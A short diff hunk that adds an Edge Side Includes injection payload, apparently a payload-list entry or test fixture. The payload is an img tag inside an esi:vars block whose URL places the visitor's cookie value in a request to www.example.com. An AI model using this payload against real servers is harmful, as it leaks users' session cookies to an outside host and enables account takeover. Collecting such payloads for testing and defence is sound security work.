@@ -1,0 +1,3 @@
+<esi:vars>
+  <img src="http://www.example.com/$(HTTP_COOKIE{type})/hello.gif"/ >
+</esi:vars>
